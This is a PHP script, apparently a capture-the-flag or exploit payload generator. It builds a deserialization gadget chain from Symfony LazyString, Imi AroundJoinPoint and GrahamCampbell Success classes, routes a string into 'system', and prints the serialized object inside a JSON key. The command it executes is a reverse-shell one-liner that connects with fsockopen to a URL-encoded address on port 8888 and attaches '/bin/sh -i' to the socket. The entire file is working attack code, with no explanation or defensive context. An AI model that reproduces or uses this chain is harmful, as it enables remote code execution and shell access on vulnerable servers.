<?php
namespace Symfony\Component\String {
    class LazyString {
        private $value;

        public function __construct($a)
        {
            $this->value = $a;
        }
    }
}

namespace Imi\Aop {
    class JoinPoint {
        protected array $args;
    }

    class AroundJoinPoint extends JoinPoint {
        private $nextProceed;

        public function __construct($a, $b)
        {
            $this->args = $a;
            $this->nextProceed = $b;
        }
    }
}

namespace GrahamCampbell\ResultType {
    class Success {
        private $value;

        public function __construct($a)
        {
            $this->value = $a;
        }
    }
}

namespace {
    $ip = "127%2E0%2E%2E1";
    $re = "php -r '\$sock=fsockopen(urldecode(\"$ip\"),8888);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";

    $exp = new \Symfony\Component\String\LazyString(
        [
            new \Imi\Aop\AroundJoinPoint(
                [new \GrahamCampbell\ResultType\Success($re), "flatMap"], 
                [new \GrahamCampbell\ResultType\Success("system"), "flatMap"]
            ),
            "proceed"
        ]
    );
    echo json_encode(["aaa|".serialize($exp)."aa" => "aaaa"]);
}
